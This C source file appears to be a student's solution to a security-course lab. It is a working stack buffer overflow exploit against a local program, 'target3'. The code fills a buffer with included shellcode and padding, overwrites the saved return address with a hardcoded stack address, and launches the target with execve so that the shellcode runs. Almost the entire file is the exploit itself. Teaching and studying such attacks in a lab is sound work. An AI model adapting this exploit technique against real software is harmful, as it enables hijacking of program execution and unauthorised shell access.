#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

//My own constants
#define BUFSIZE 73
#define TARGET_RA_ADDR 0x202dfe14	//this is 4 bytes + starting address of buf. Since targ += strlen(targ) which is 4 bytes of 'A'. Will change return address for foo
#define SHELL_LENGTH 45



int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	//printf("Target3.c: Before making attack bufferzz:\n");

	char attack_buffer[BUFSIZE];
	
	//First fill ALL of attack buffer with non null characters to avoid reaching nulls in random places when sending buffer.
	int i;
	for(i = 0; i< BUFSIZE;i++)
	{
		attack_buffer[i] = 0x04;
	}

	//Fill first 45 bytes of buffer with shellcode
	for(i = 0; i< SHELL_LENGTH;i++)
	{
		attack_buffer[i] = shellcode[i];
	}

	//Some portion with random value just to help debug
	for(i = 45 ; i < 67; i++)
	{
		attack_buffer[i] = 0x05;
	}

	//attack_buffer[68] to attack_buffer[71] will have return address which is 4+ address of buf
	int *a = (int*) &attack_buffer[68];
	*a = TARGET_RA_ADDR;

	//Put a null character at end of attack_buffer which is at index 72 to show that args[1] ends here. Target wont accept more than 2 arguments anyways like args[2], 
	//since it checks at the very beginning
	attack_buffer[BUFSIZE - 1] = '\0';

	args[0] = TARGET;
	args[1] = attack_buffer;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
